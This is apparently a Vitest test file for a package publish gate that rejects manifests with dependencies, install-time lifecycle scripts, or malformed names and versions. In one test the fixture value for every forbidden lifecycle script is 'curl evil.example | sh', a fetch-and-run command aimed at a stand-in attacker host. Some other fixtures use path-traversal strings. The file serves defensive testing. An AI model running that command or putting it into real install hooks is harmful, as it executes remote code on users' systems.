import { describe, expect, it } from 'vitest'
import { FORBIDDEN_LIFECYCLE_SCRIPTS, checkPublishGate } from '../src/tarball/gate.ts'
import { cleanPackageManifest } from './helpers/tar.ts'

describe('checkPublishGate (publish-side zero-dependency + no-scripts gate)', () => {
  it('accepts a zero-dependency, no-lifecycle-script manifest', () => {
    const result = checkPublishGate(cleanPackageManifest())
    expect(result).toEqual({ ok: true, name: '@huaanwork/sample-plugin', version: '1.2.3' })
  })

  it('accepts peerDependencies (exempt) and bundleDependencies (allowed)', () => {
    const result = checkPublishGate(
      cleanPackageManifest({
        peerDependencies: { cordis: '^1.0.0' },
        bundleDependencies: ['some-vendored-lib'],
      }),
    )
    expect(result.ok).toBe(true)
  })

  it('rejects non-empty dependencies and names them', () => {
    const result = checkPublishGate(cleanPackageManifest({ dependencies: { lodash: '^4.0.0', axios: '^1.0.0' } }))
    expect(result.ok).toBe(false)
    if (!result.ok) {
      expect(result.rejection.code).toBe('nonzero-dependencies')
      expect(result.rejection.message).toContain('dependencies.axios')
      expect(result.rejection.message).toContain('dependencies.lodash')
    }
  })

  it('rejects non-empty optionalDependencies', () => {
    const result = checkPublishGate(cleanPackageManifest({ optionalDependencies: { fsevents: '^2.0.0' } }))
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.rejection.code).toBe('nonzero-dependencies')
  })

  it('rejects each forbidden lifecycle script', () => {
    for (const script of FORBIDDEN_LIFECYCLE_SCRIPTS) {
      const result = checkPublishGate(cleanPackageManifest({ scripts: { [script]: 'curl evil.example | sh' } }))
      expect(result.ok, script).toBe(false)
      if (!result.ok) {
        expect(result.rejection.code).toBe('lifecycle-scripts')
        expect(result.rejection.message).toContain(script)
      }
    }
  })

  it('allows non-lifecycle scripts (build/test are fine — they never run at install)', () => {
    const result = checkPublishGate(cleanPackageManifest({ scripts: { build: 'tsc', test: 'vitest' } }))
    expect(result.ok).toBe(true)
  })

  it('rejects multiple lifecycle scripts with all of them named', () => {
    const result = checkPublishGate(
      cleanPackageManifest({ scripts: { prepare: 'true', postinstall: 'true', build: 'tsc' } }),
    )
    expect(result.ok).toBe(false)
    if (!result.ok) {
      expect(result.rejection.message).toContain('postinstall')
      expect(result.rejection.message).toContain('prepare')
      expect(result.rejection.message).not.toContain('build')
    }
  })

  it('rejects an invalid package identity', () => {
    for (const name of ['', '..', 'has/slash/extra', 42]) {
      const result = checkPublishGate(cleanPackageManifest({ name }))
      expect(result.ok, String(name)).toBe(false)
      if (!result.ok) expect(result.rejection.code).toBe('invalid-package-identity')
    }
    const badVersion = checkPublishGate(cleanPackageManifest({ version: '1.0.0/../x' }))
    expect(badVersion.ok).toBe(false)
  })
})
